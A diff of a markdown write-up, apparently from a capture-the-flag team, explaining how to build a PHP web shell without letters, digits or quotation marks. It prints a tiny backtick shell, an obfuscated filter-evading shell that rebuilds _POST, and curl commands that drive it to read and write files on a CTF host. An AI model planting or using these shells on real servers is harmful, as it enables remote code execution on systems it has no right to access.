@@ -1,6 +1,8 @@
 # Non-Alphanumeric WebShell in PHP
 
-The main goal of a php shell is that you can execute code on the server from the outside. This can happen via a normal eval shell or with a tiny shell like this:
+The main goal of a php shell is that you can execute code on the server from the outside.
+
+This can happen via a normal eval shell or with a tiny shell like this:
 ```php
 <?=`$_GET[1]`?>
 ```
@@ -12,6 +14,7 @@ Common chars to be blocked or filtered are
 ```
 
 To be still able to deploy a working shell there are a few things we need to do.
+
 At first there are already non-alphanumeric shells out in the wild but the ones i have seen had one thing in common they needed Quotation marks to create a string once to craft letters out of it.
 
 So I thought to myself, that it would be a quite cool idea to develope a shell which could avoid that and still work the same way.
@@ -36,6 +39,7 @@ Not optimal at all but it works, it crafts a string element at the start from an
 | a | 5 | T |
 
 Which resulted in \_POST and then can be used to run functions with arguments over code. (This feature is present since php7)
+
 Like this:
 
 ```php
@@ -68,10 +72,13 @@ curl https://host.ctf.com/shell.php -X POST -F "0=print_r" -F "1=file_get_conten
 ```
 
 The full tryhard shell can be archived with this snipped:
+
 ```php
 <?=0;$_=[]..1;$_=${$_[6].$_[3].$_[4].$_[3].$_[3]^($_^$_[5]).+1625};$_[0]($_[1]($_[2], $_[3]));
 ```
+
 With this setup we can run any function with as much arguments as we like.
+
 
 ```bash
 curl https://host.ctf.com/shell.php -X POST -F "0=print_r" -F "1=call_user_func_array" -F "2=file_put_contents" -F "3[]=hello.txt" -F "3[]=testcontent"
@@ -79,4 +86,5 @@ curl https://host.ctf.com/shell.php -X POST -F "0=print_r" -F "1=call_user_func_
 
 
 Cli-Ish over and out.
+
 PS: Checkout our cool team page https://pwnprophecy.tk)
